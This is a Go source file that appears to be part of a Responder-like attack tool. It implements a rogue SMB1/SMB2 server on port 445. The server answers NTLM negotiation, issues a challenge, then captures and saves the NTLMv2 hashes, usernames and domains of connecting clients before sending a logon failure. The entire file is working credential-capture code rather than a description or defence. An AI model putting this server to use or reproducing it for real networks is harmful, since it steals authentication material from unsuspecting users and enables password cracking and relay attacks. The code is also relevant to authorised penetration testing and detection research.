package main

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"
)

var (
	smb2Magic  = []byte{0xFE, 0x53, 0x4D, 0x42}
	smb1Magic  = []byte{0xFF, 0x53, 0x4D, 0x42}
	serverGUID [16]byte
)

func init() { rand.Read(serverGUID[:]) }

const (
	smb2CmdNegotiate    = uint16(0x0000)
	smb2CmdSessionSetup = uint16(0x0001)

	statusSuccess                = uint32(0x00000000)
	statusMoreProcessingRequired = uint32(0xC0000016)
	statusLogonFailure           = uint32(0xC000006D)

	smb1CmdNegotiate    = byte(0x72)
	smb1CmdSessionSetup = byte(0x73)
)

func serveSMB(ip net.IP) {
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:445", ip))
	if err != nil {
		logError("SMB listen :445 — %v (need root?)", err)
		return
	}
	logInfo("SMB  listening on %s:445", ip)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleSMB(conn)
	}
}

func handleSMB(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	challenge := getChallenge()
	challengeIssued := false

	for {
		nb := make([]byte, 4)
		if _, err := io.ReadFull(conn, nb); err != nil {
			return
		}
		msgLen := int(nb[1])<<16 | int(nb[2])<<8 | int(nb[3])
		if msgLen < 4 || msgLen > 1<<20 {
			return
		}
		msg := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, msg); err != nil {
			return
		}

		switch {
		// ── SMB1 ──────────────────────────────────────────────────────────
		case bytes.HasPrefix(msg, smb1Magic):
			if len(msg) < 32 {
				return
			}
			cmd := msg[4]
			switch cmd {
			case smb1CmdNegotiate:
				dialectIdx := smb1FindDialect(msg)
				switch dialectIdx {
				case -1:
					return
				case -2:
					// Client includes SMB2 dialects — tell it to upgrade to SMB2
					sendNB(conn, smb1SMB2UpgradeResp(msg))
					logVerbose("SMB1 multi-protocol from %s — upgrading to SMB2", conn.RemoteAddr())
					// continue loop; next packet will be SMB2 NEGOTIATE
				default:
					sendNB(conn, smb1NegotiateResp(msg, dialectIdx))
				}

			case smb1CmdSessionSetup:
				blob := smb1ExtractBlob(msg)
				if blob == nil {
					return
				}
				ntlm := FindNTLMSSP(blob)
				if len(ntlm) < 12 {
					return
				}
				switch ntlmMsgType(ntlm) {
				case 1: // Type1 Negotiate → issue challenge
					ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
					spnego := WrapSPNEGOChallenge(ntlmChallenge)
					challengeIssued = true
					sendNB(conn, smb1SessionSetupResp(msg, statusMoreProcessingRequired, spnego))
					logVerbose("SMB1 NTLM Type1 from %s — issuing challenge", conn.RemoteAddr())

				case 3: // Type3 Authenticate → capture
					if !challengeIssued {
						return
					}
					hash, user, domain, err := ParseNTLMAuthenticate(ntlm, challenge)
					if err != nil {
						logVerbose("SMB1 NTLM parse: %v", err)
						return
					}
					logSuccess("[SMB] NTLMv2 captured from %s", conn.RemoteAddr())
					logSuccess("      %s\\%s", domain, user)
					logSuccess("      %s", hash)
					saveHash(hash)
					sendNB(conn, smb1SessionSetupResp(msg, statusLogonFailure, nil))
					return
				}
			}

		// ── SMB2 ──────────────────────────────────────────────────────────
		case bytes.HasPrefix(msg, smb2Magic):
			if len(msg) < 64 {
				return
			}
			cmd := binary.LittleEndian.Uint16(msg[12:14])
			msgID := binary.LittleEndian.Uint64(msg[24:32])

			switch cmd {
			case smb2CmdNegotiate:
				sendNB(conn, smb2NegotiateResp(msgID))
				logVerbose("SMB2 NEGOTIATE from %s msgID=%d — sent response", conn.RemoteAddr(), msgID)

			case smb2CmdSessionSetup:
				if len(msg) < 80 {
					logVerbose("SMB2 SESSION_SETUP too short (%d bytes) from %s", len(msg), conn.RemoteAddr())
					return
				}
				// SESSION_SETUP body at msg[64]: StructureSize(2) Flags(1) SecurityMode(1)
				// Capabilities(4) Channel(4) SecurityBufferOffset(2) SecurityBufferLength(2)
				secOff := binary.LittleEndian.Uint16(msg[76:78])
				secLen := binary.LittleEndian.Uint16(msg[78:80])
				logVerbose("SMB2 SESSION_SETUP from %s: secOff=%d secLen=%d msgLen=%d", conn.RemoteAddr(), secOff, secLen, len(msg))
				if int(secOff)+int(secLen) > len(msg) {
					logVerbose("SMB2 SESSION_SETUP bounds error from %s: secOff=%d secLen=%d len=%d", conn.RemoteAddr(), secOff, secLen, len(msg))
					return
				}
				secBuf := msg[secOff : secOff+secLen]
				ntlm := FindNTLMSSP(secBuf)
				if len(ntlm) < 12 {
					logVerbose("SMB2 SESSION_SETUP no NTLMSSP from %s (secBuf len=%d hex=%x)", conn.RemoteAddr(), len(secBuf), func() []byte {
						if len(secBuf) > 32 {
							return secBuf[:32]
						}
						return secBuf
					}())
					return
				}
				switch ntlmMsgType(ntlm) {
				case 1:
					challengeIssued = true
					sendNB(conn, smb2SessionSetupChallenge(msgID, challenge))
					logVerbose("SMB2 NTLM Type1 from %s — issuing challenge", conn.RemoteAddr())
				case 3:
					if !challengeIssued {
						return
					}
					hash, user, domain, err := ParseNTLMAuthenticate(ntlm, challenge)
					if err != nil {
						logVerbose("SMB2 NTLM parse: %v", err)
						return
					}
					logSuccess("[SMB] NTLMv2 captured from %s", conn.RemoteAddr())
					logSuccess("      %s\\%s", domain, user)
					logSuccess("      %s", hash)
					saveHash(hash)
					sendNB(conn, smb2Error(smb2CmdSessionSetup, msgID, statusLogonFailure))
					return
				}
			}

		default:
			return
		}
	}
}

// ── SMB1 helpers ────────────────────────────────────────────────────────────

// smb1FindDialect parses the negotiate request and returns:
//   -2 if "SMB 2.???" or "SMB 2.002" dialect is present (upgrade to SMB2)
//    N index of "NT LM 0.12" dialect
//   -1 if no suitable dialect found
func smb1FindDialect(msg []byte) int {
	if len(msg) < 35 {
		return -1
	}
	body := msg[32:] // skip 32-byte SMB header
	// body[0] = WordCount (0 for negotiate request)
	if len(body) < 3 {
		return -1
	}
	byteCount := int(binary.LittleEndian.Uint16(body[1:3]))
	if 3+byteCount > len(body) {
		return -1
	}
	dialects := body[3 : 3+byteCount]
	idx := 0
	ntlmIdx := -1
	hasSMB2 := false
	for len(dialects) > 1 {
		if dialects[0] != 0x02 {
			break
		}
		dialects = dialects[1:]
		end := bytes.IndexByte(dialects, 0x00)
		if end < 0 {
			break
		}
		switch string(dialects[:end]) {
		case "SMB 2.???", "SMB 2.002":
			hasSMB2 = true
		case "NT LM 0.12":
			ntlmIdx = idx
		}
		dialects = dialects[end+1:]
		idx++
	}
	if hasSMB2 {
		return -2
	}
	return ntlmIdx
}

// smb1SMB2UpgradeResp responds to an SMB1 multi-protocol negotiate with a full
// SMB2 NEGOTIATE Response (the real Responder approach). This causes the client
// to skip a second SMB2 NEGOTIATE and go directly to SESSION_SETUP.
func smb1SMB2UpgradeResp(_ []byte) []byte {
	return smb2NegotiateResp(0)
}

// smb1NegotiateResp builds a SMB1 NEGOTIATE response for NT LM 0.12
// with extended security (SPNEGO NegTokenInit).
func smb1NegotiateResp(req []byte, dialectIdx int) []byte {
	mid := binary.LittleEndian.Uint16(req[30:32])

	spnego := BuildSPNEGONegotiateToken()

	epoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	ft := uint64(time.Since(epoch).Nanoseconds() / 100)

	// 32-byte SMB1 response header
	hdr := smb1Header(smb1CmdNegotiate, statusSuccess, 0xFFFF, mid)

	// Parameters (WordCount=17, 34 bytes):
	//   DialectIndex(2) SecurityMode(1) MaxMpxCount(2) MaxNumberVcs(2)
	//   MaxBufferSize(4) MaxRawSize(4) SessionKey(4) Capabilities(4)
	//   SystemTime(8) ServerTimeZone(2) ChallengeLength(1)
	var params []byte
	params = binary.LittleEndian.AppendUint16(params, uint16(dialectIdx))
	params = append(params, 0x03) // SecurityMode: USER_SECURITY | ENCRYPTED_PASSWORDS
	params = binary.LittleEndian.AppendUint16(params, 50)
	params = binary.LittleEndian.AppendUint16(params, 1)
	params = binary.LittleEndian.AppendUint32(params, 16644)
	params = binary.LittleEndian.AppendUint32(params, 65536)
	params = binary.LittleEndian.AppendUint32(params, 0)
	params = binary.LittleEndian.AppendUint32(params, 0x80000374) // Capabilities + EXTENDED_SECURITY
	params = binary.LittleEndian.AppendUint64(params, ft)
	params = binary.LittleEndian.AppendUint16(params, 0) // ServerTimeZone
	params = append(params, 0x00)                         // ChallengeLength = 0 (extended sec)

	// Data: ServerGUID (16 bytes) + SPNEGO
	data := make([]byte, 16)
	copy(data, serverGUID[:])
	data = append(data, spnego...)

	var pkt []byte
	pkt = append(pkt, hdr...)
	pkt = append(pkt, 17)                                                      // WordCount
	pkt = append(pkt, params...)                                               // 34 bytes
	pkt = binary.LittleEndian.AppendUint16(pkt, uint16(len(data)))            // ByteCount
	pkt = append(pkt, data...)
	return pkt
}

// smb1ExtractBlob extracts the SecurityBlob from an SMB1 SESSION_SETUP_ANDX
// request (extended security format, WordCount=12).
func smb1ExtractBlob(msg []byte) []byte {
	if len(msg) < 32+1+24+2 {
		return nil
	}
	body := msg[32:]
	wc := body[0]
	if wc != 12 { // extended security format
		return nil
	}
	// SecurityBlobLength at body[15:17]
	// body layout (after WordCount byte):
	//   AndXCmd(1) AndXRsv(1) AndXOff(2) MaxBufSize(2) MaxMpxCount(2)
	//   VcNumber(2) SessionKey(4) SecurityBlobLength(2) Reserved(4) Capabilities(4)
	// offsets relative to body[0]:
	//   0=WordCount 1=AndXCmd 2=AndXRsv 3-4=AndXOff 5-6=MaxBufSize 7-8=MaxMpxCount
	//   9-10=VcNumber 11-14=SessionKey 15-16=SecurityBlobLen 17-20=Reserved
	//   21-24=Capabilities 25-26=ByteCount 27=SecurityBlob start
	blobLen := int(binary.LittleEndian.Uint16(body[15:17]))
	if 27+blobLen > len(body) {
		return nil
	}
	return body[27 : 27+blobLen]
}

// smb1SessionSetupResp builds the SMB1 SESSION_SETUP_ANDX response.
// Pass status=statusMoreProcessingRequired for the challenge, statusLogonFailure for error.
// secBlob is the SPNEGO wrapped NTLM payload (nil for error response).
func smb1SessionSetupResp(req []byte, status uint32, secBlob []byte) []byte {
	mid := binary.LittleEndian.Uint16(req[30:32])

	// Trailing empty UTF-16LE strings: NativeOS, NativeLanMan, PrimaryDomain
	suffix := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}

	byteCount := uint16(len(secBlob) + len(suffix))
	// AndXOffset = distance from start of SMB header to end of response
	andxOff := uint16(32 + 1 + 8 + 2 + len(secBlob) + len(suffix))

	hdr := smb1Header(smb1CmdSessionSetup, status, 0xFFFF, mid)
	// UID = 1 in header
	binary.LittleEndian.PutUint16(hdr[28:30], 0x0001)

	var pkt []byte
	pkt = append(pkt, hdr...)
	pkt = append(pkt, 4)                   // WordCount
	pkt = append(pkt, 0xFF, 0x00)          // AndXCommand (none), AndXReserved
	pkt = binary.LittleEndian.AppendUint16(pkt, andxOff)
	pkt = binary.LittleEndian.AppendUint16(pkt, 0x0000) // Action (not guest)
	pkt = binary.LittleEndian.AppendUint16(pkt, uint16(len(secBlob)))
	pkt = binary.LittleEndian.AppendUint16(pkt, byteCount) // ByteCount
	pkt = append(pkt, secBlob...)
	pkt = append(pkt, suffix...)
	return pkt
}

// smb1Header builds a 32-byte SMB1 response header.
func smb1Header(cmd byte, status uint32, tid uint16, mid uint16) []byte {
	h := make([]byte, 32)
	copy(h[0:4], smb1Magic)
	h[4] = cmd
	binary.LittleEndian.PutUint32(h[5:9], status)
	h[9] = 0x88  // Flags: REPLY | CASE_INSENSITIVE | CANONICAL_PATHS
	// Flags2: UNICODE | NT_STATUS | EXTENDED_SECURITY | LONG_NAMES
	binary.LittleEndian.PutUint16(h[10:12], 0xC853)
	binary.LittleEndian.PutUint16(h[24:26], tid)
	binary.LittleEndian.PutUint16(h[26:28], 0xFFFE) // PID
	binary.LittleEndian.PutUint16(h[30:32], mid)
	return h
}

// ── SMB2 helpers ────────────────────────────────────────────────────────────

func sendNB(conn net.Conn, data []byte) {
	hdr := []byte{0x00, byte(len(data) >> 16), byte(len(data) >> 8), byte(len(data))}
	conn.Write(append(hdr, data...))
}

func smb2Header(cmd uint16, msgID uint64, status uint32, sessionID uint64) []byte {
	h := make([]byte, 64)
	copy(h[0:4], smb2Magic)
	binary.LittleEndian.PutUint16(h[4:6], 64)
	binary.LittleEndian.PutUint32(h[8:12], status)
	binary.LittleEndian.PutUint16(h[12:14], cmd)
	binary.LittleEndian.PutUint16(h[14:16], 1)          // CreditResponse
	binary.LittleEndian.PutUint32(h[16:20], 0x00000001) // Flags: response
	binary.LittleEndian.PutUint64(h[24:32], msgID)
	binary.LittleEndian.PutUint32(h[32:36], 0xFFFE) // ProcessId
	binary.LittleEndian.PutUint64(h[40:48], sessionID)
	return h
}

func smb2NegotiateResp(msgID uint64) []byte {
	spnego := BuildSPNEGONegotiateToken()
	hdr := smb2Header(smb2CmdNegotiate, msgID, statusSuccess, 0)

	epoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	ft := uint64(time.Since(epoch).Nanoseconds() / 100)
	secBufOff := uint16(64 + 64)

	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, uint16(65))     // StructureSize
	binary.Write(&b, binary.LittleEndian, uint16(0x0001)) // SecurityMode: SIGNING_ENABLED
	binary.Write(&b, binary.LittleEndian, uint16(0x0210)) // DialectRevision = SMB 2.1
	binary.Write(&b, binary.LittleEndian, uint16(0))      // NegotiateContextCount = 0 (< 3.1.1)
	b.Write(serverGUID[:])
	binary.Write(&b, binary.LittleEndian, uint32(0x7F))
	binary.Write(&b, binary.LittleEndian, uint32(8388608))
	binary.Write(&b, binary.LittleEndian, uint32(8388608))
	binary.Write(&b, binary.LittleEndian, uint32(8388608))
	binary.Write(&b, binary.LittleEndian, ft)
	binary.Write(&b, binary.LittleEndian, uint64(0))
	binary.Write(&b, binary.LittleEndian, secBufOff)
	binary.Write(&b, binary.LittleEndian, uint16(len(spnego)))
	binary.Write(&b, binary.LittleEndian, uint32(0))
	b.Write(spnego)

	return append(hdr, b.Bytes()...)
}

func smb2SessionSetupChallenge(msgID uint64, challenge [8]byte) []byte {
	ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
	spnego := WrapSPNEGOChallenge(ntlmChallenge)
	hdr := smb2Header(smb2CmdSessionSetup, msgID, statusMoreProcessingRequired, 0x1234)
	secBufOff := uint16(64 + 8)
	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, uint16(9))
	binary.Write(&b, binary.LittleEndian, uint16(0))
	binary.Write(&b, binary.LittleEndian, secBufOff)
	binary.Write(&b, binary.LittleEndian, uint16(len(spnego)))
	b.Write(spnego)
	return append(hdr, b.Bytes()...)
}

func smb2Error(cmd uint16, msgID uint64, status uint32) []byte {
	hdr := smb2Header(cmd, msgID, status, 0)
	body := []byte{0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	return append(hdr, body...)
}
